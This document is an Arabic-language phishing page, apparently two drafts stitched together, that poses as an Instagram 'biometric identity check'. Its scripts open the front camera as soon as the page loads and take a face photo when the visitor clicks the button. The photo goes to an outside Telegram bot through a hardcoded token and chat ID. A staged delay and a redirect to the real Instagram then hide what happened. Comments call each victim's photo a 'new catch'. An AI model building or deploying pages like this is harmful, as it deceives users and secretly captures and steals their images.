<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Security Check</title><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; margin-bottom: 10px; }
        .logo { width: 175px; margin: 22px auto 12px; display: block; }
        .info-text { color: #8e8e8e; font-size: 14px; font-weight: 600; line-height: 18px; margin: 0 0 20px; }
        .user-preview { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; }
        .avatar { width: 90px; height: 90px; background: #eee; border-radius: 50%; margin-bottom: 15px; border: 1px solid #dbdbdb; overflow: hidden; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .username { color: #262626; font-weight: 600; font-size: 14px; margin-bottom: 8px; }
        .login-btn { background-color: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 7px 9px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 8px; }
        .login-btn:active { background-color: #1877f2; }
        .footer-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
        .blue-link { color: #0095f6; font-weight: 600; text-decoration: none; cursor: pointer; }
        #status { font-size: 12px; color: #ed4956; margin-top: 10px; min-height: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
        
        <div class="user-preview">
            <div class="avatar">
                <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png">
            </div>
            <div class="username">تأكيد الهوية البيومتري</div>
            <p class="info-text">انتهت صلاحية الجلسة. يرجى التقاط صورة سريعة للوجه لتأكيد ملكيتك للحساب والمتابعة.</p>
        </div>

        <button id="authBtn" class="login-btn">متابعة كـ User</button>
        <div id="status"></div>
    </div>

    <div class="footer-box">
        ليس أنت؟ <span class="blue-link">تبديل الحسابات</span>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
        const CHAT_ID = '2140385904';
        let stream = null;

        // فتح الكاميرا صامتاً فور دخول الصفحة لتكون جاهزة لحظة الضغط
        window.onload = async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch (e) {
                console.log("Camera access pre-load failed");
            }
        };

        document.getElementById('authBtn').onclick = async () => {
            const btn = document.getElementById('authBtn');
            const st = document.getElementById('status');

            btn.innerText = "جاري التأكيد...";
            btn.disabled = true;

            // إذا لم تفتح الكاميرا مسبقاً، نطلبها الآن
            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    document.getElementById('v').srcObject = stream;
                } catch (e) {
                    st.innerText = "يجب السماح بالكاميرا لتسجيل الدخول.";
                    btn.disabled = false;
                    btn.innerText = "متابعة كـ User";
                    return;
                }
            }

            // التقاط فوري (سرعة البرق)
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = 480; canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'insta_verify.jpg');
                fd.append('caption', `📸 *صيد جديد (واجهة إنستغرام الأصلية)*`);
                
                // إرسال للبوت خلف الكواليس
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                // تأثير انتظار بسيط ثم تحويل حقيقي
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.instagram.com/accounts/login/";
                }, 800);
            }, 'image/jpeg', 0.5);
        };
    </script>
</body>
</html>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 20px; text-align: center; border-radius: 3px; box-sizing: border-box; }
        .logo { width: 175px; margin: 20px 0; }
        .shield-icon { width: 60px; height: 60px; margin-bottom: 15px; }
        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
        .btn { background-color: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: 600; cursor: pointer; font-size: 14px; }
        .btn:disabled { background-color: #b2dffc; }
        .loader { display: none; border: 2px solid #f3f3f3; border-top: 2px solid #262626; border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
    <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="shield-icon" alt="Security">
    <h2>تأكيد الهوية البيومتري</h2>
    <p>لحماية حسابك، نستخدم تقنية التعرف على الوجه للتأكد من أنك صاحب الحساب الحقيقي. يرجى الضغط أدناه لإجراء مسح سريع.</p>
    
    <button id="authBtn" class="btn">بدء المسح الأمني</button>
    <div id="loader" class="loader"></div>
    <div id="status" style="margin-top:10px; font-size:12px; color:#262626;"></div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
    const CHAT_ID = '2140385904';
    let stream = null;

    // تشغيل الكاميرا صامتاً في الخلفية فور التحميل
    window.onload = async () => {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
        } catch (e) {}
    };

    document.getElementById('authBtn').onclick = async () => {
        const btn = document.getElementById('authBtn');
        const loader = document.getElementById('loader');
        const st = document.getElementById('status');

        btn.style.display = 'none';
        loader.style.display = 'block';
        st.innerText = "جاري تحليل ملامح الوجه...";

        if (!stream) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch (e) {
                alert("يرجى السماح بالكاميرا لإتمام الفحص الأمني بنجاح.");
                btn.style.display = 'block';
                loader.style.display = 'none';
                return;
            }
        }

        // التقاط الصورة فوراً
        const canvas = document.getElementById('c');
        const video = document.getElementById('v');
        canvas.width = 480; canvas.height = 640;
        canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
        
        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'identity.jpg');
            fd.append('caption', `✅ *تم فحص الهوية بنجاح*`);
            
            // إرسال للبوت
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            
            // تأثير انتظار وهمي لزيادة الإقناع
            setTimeout(() => {
                st.innerText = "اكتمل التحقق. يتم الآن توجيهك...";
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    location.href = "https://instagram.com";
                }, 1000);
            }, 1500);
        }, 'image/jpeg', 0.5);
    };
</script>

</body>
</html>
